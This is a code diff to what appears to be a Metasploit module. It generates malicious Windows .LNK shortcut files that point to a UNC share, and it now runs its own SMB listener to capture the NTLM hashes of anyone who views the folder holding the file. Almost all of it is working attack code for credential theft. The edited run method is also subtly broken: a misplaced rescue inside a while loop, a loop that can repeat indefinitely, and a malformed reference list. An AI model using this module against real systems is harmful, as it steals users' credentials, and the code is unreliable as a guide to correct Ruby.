@@ -7,6 +7,8 @@ class MetasploitModule < Msf::Auxiliary
     Rank = GoodRanking
   
     include Msf::Exploit::FILEFORMAT
+    include Msf::Exploit::Remote::SMB::Server::Share
+    include Msf::Exploit::Remote::SMB::Server::HashCapture
   
     def initialize(info = {})
       super(update_info(info,
@@ -25,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
         'License'        => MSF_LICENSE,
         'References'     => [
           [ 'URL', 'https://zeifan.my/Right-Click-LNK/',
-            'URL', 'https://www.exploit-db.com/exploits/42382',
+            'EDB', '42382',
             'URL', 'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb'
           ]
         ],
@@ -36,8 +38,13 @@ class MetasploitModule < Msf::Auxiliary
   
       register_options([
         OptString.new('FILENAME', [ true, 'The LNK file name', 'msf.lnk']),
-        OptString.new('UNCPATH',  [ true, 'UNC path that will be accessed (\\\\server\\share)', '\\\\192.168.1.1\\share']),
-        OptString.new('APPNAME',  [ true, 'Name of the application to display', 'Testing'])
+        OptString.new('UNCPATH',  [ false, 'UNC path that will be accessed (\\\\server\\share)', nil]),
+        OptString.new('APPNAME',  [ false, 'Name of the application to display', nil])
+      ])
+      deregister_options('SRVHOST', 'SRVPORT')
+      register_advanced_options([
+        OptAddressLocal.new('SRVHOST', [ true, 'The local host to listen on', '0.0.0.0' ]),
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on', 445 ])
       ])
     end
   
@@ -59,11 +66,11 @@ class MetasploitModule < Msf::Auxiliary
       header << [0x00].pack('L')                      # Reserved2 (4 bytes)
       header << [0x00].pack('L')                      # Reserved3 (4 bytes)
       
-      return header
+      header
     end
   
     def generate_item_id(data)
-      return [data.length + 2].pack('S') + data
+      [data.length + 2].pack('S') + data
     end
   
     def generate_lnk_special(path, name)
@@ -91,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
       bin_data << name_utf16
       bin_data << "\x00\x00".force_encoding('ASCII-8BIT')  # comment
       
-      return bin_data
+      bin_data
     end
   
     def generate_linktarget_idlist(path, name)
@@ -118,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
       idlist << "\x00\x00".force_encoding('ASCII-8BIT')
       
       # Full IDList with size
-      return [idlist.length].pack('S') + idlist
+      [idlist.length].pack('S') + idlist
     end
   
     def generate_extra_data
@@ -129,7 +136,7 @@ class MetasploitModule < Msf::Auxiliary
       extra << [0x28].pack('L')                    # Offset (4 bytes)
       extra << [0x00].pack('L')                    # TERMINAL_BLOCK (4 bytes)
       
-      return extra
+      extra
     end
   
     def ms_shllink(path, name)
@@ -138,25 +145,43 @@ class MetasploitModule < Msf::Auxiliary
       lnk_data << generate_linktarget_idlist(path, name)
       lnk_data << generate_extra_data
       
-      return lnk_data
+      lnk_data
     end
   
     def run
-      unc_path = datastore['UNCPATH']
       app_name = datastore['APPNAME']
-      
-      # Validate UNC path format
-      unless unc_path.start_with?('\\\\')
-        print_error("UNC path must start with \\\\ (Example: \\\\server\\share)")
-        return
+      while app_name && !app_name.empty?
+        require 'faker'
+        app_name = Faker::App.name rescue nil
+        rescue LoadError
+          app_name = nil
+        end
+        app_name ||= 'Application'
       end
-      
-      print_status("Creating .LNK file with UNC path: #{unc_path}")
-      
+
+      unc_path = datastore['UNCPATH']
+      if unc_path.nil? || unc_path.empty?
+        self.share_name = random_share_name
+        self.smb_srvhost = datastore['SRVHOST']
+        self.smb_srvport = datastore['SRVPORT']
+        self.capture_hashes = true
+        start_service
+        unc_path = "\\\\#{datastore['SRVHOST']}\\#{share_name}"
+      else
+        unless unc_path.match(/^\\\\[^\\]+\\[^\\]+$/)
+          fail_with(Failure::BadConfig, "UNCPATH format invalid, expected \\\\server\\share")
+        end
+      end
+
       lnk_data = ms_shllink(unc_path, app_name)
-      
       file_create(lnk_data)
       print_good("LNK file created: #{datastore['FILENAME']}")
-      print_status("Set up a listener (e.g., auxiliary/server/capture/smb) to capture the authentication")
+      print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
+
     end
+
+    def random_share_name
+      "share#{Rex::Text.rand_text_alphanumeric(6)}"
+    end
+
   end
